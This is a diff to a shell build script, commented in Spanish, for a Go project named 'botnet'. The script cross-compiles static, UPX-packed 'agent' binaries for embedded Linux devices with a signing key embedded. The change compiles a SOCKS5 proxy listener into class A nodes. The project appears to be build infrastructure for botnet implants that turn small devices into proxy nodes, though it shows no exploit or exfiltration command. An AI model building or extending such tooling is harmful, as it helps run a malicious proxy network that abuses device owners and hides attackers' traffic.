@@ -23,11 +23,16 @@ LDFLAGS="-s -w -X main.version=${VERSION}"
 if [ -f deploy/signing/keys/root_ed25519.pub ]; then
   LDFLAGS="$LDFLAGS -X github.com/botnet/botnet/internal/agent.RootPubKeyBase64=$(tr -d '\r\n' <deploy/signing/keys/root_ed25519.pub)"
 fi
-MAX_A=4194304     # 4 MiB, perfil A (slots A/B, flash 8 MB): mismo tope que
+MAX_A=8900000     # 8,9 MB: clase A lleva el proxy SOCKS5 compilado (-tags socks5)
+#                  y el binario pasa de 2,55 a ~8,40 MB. Sigue bajo el techo de
+#                  flash 8.388.608 B con 14 KB de margen: si crece, se revisa.
+#                  El valor viejo era 4194304 (4 MiB, sin proxy).
 MAX_BC_UPX=2726297 # 2,6 MiB post-upx (AC T-0204: el empaquetado pasa a --lzma, -9 solo daba 2,76 MB)
 #                  profiles.yaml max_bytes (una sola verdad de la matriz)
 MAX_F1=4194304    # puerta F1: 5 archs de la fase <= 4 MB
 USE_UPX="${UPX:-1}"
+DRY_RUN=0
+case "${1:-}" in --dry-run) DRY_RUN=1 ;; esac
 mkdir -p "$DIST"
 
 # tags: nombre público del arch -> (GOARCH, GOARM). mips es big-endian por
@@ -77,7 +82,16 @@ for tag in $tags; do
   envargs=(GOOS=linux "GOARCH=$arch" CGO_ENABLED=0)
   [ -n "$arm" ] && envargs+=(GOARM="$arm")
   echo "== $tag: $(env "${envargs[@]}" go env GOOS GOARCH | tr '\n' ' ')(GOARM=${arm:-off}) CGO_ENABLED=$(env "${envargs[@]}" go env CGO_ENABLED)"
-  env "${envargs[@]}" go build -trimpath -buildvcs=false -ldflags "$LDFLAGS" -o "$out" "./cmd/$BINARY"
+  # Solo clase A lleva el proxy: B/C no caben con el tag y conservan el stub.
+  # La receta de clase A es literalmente `-trimpath -tags socks5`.
+  # (internal/proxy/socks5_stub.go). `-tags socks5` es lo que hace que el nodo
+  # tenga listener propio en vez de un proxy apagado.
+  build_tags=""
+  case "$class" in A) build_tags="-tags socks5" ;; esac
+  if [ "${DRY_RUN:-0}" = "1" ]; then
+    echo "  go build -trimpath $build_tags -ldflags ... -o $out ./cmd/$BINARY"
+  fi
+  env "${envargs[@]}" go build -trimpath $build_tags -buildvcs=false -ldflags "$LDFLAGS" -o "$out" "./cmd/$BINARY"
   # Criterio 3: las build settings del binario deben mostrar CGO_ENABLED=0.
   # Va ANTES de upx: el empaquetado se lleva las secciones donde vive el
   # buildinfo de Go (`go version -m` solo lee ELF virgen).
@@ -87,7 +101,9 @@ for tag in $tags; do
   if ! is_static "$out"; then
     echo "FAIL $tag: binario dynamically linked (exigido estático)"; fail=1; continue
   fi
-  if [ "$USE_UPX" = "1" ] && command -v upx >/dev/null 2>&1; then
+  # Clase A no se empaqueta: con el proxy pesa ~8 MB, cabe bajo 8,9 MB y el
+  # binario se puede inspeccionar con `strings`. B/C si se empaquetan.
+  if [ "$USE_UPX" = "1" ] && [ "$class" != "A" ] && command -v upx >/dev/null 2>&1; then
     # --lzma: -9 solo daba 2,76 MB y el AC de clase C pide <= 2,6 MB;
     # con lzma el mismo binario baja a ~2,24 MB.
     upx --lzma --best -q "$out" >/dev/null
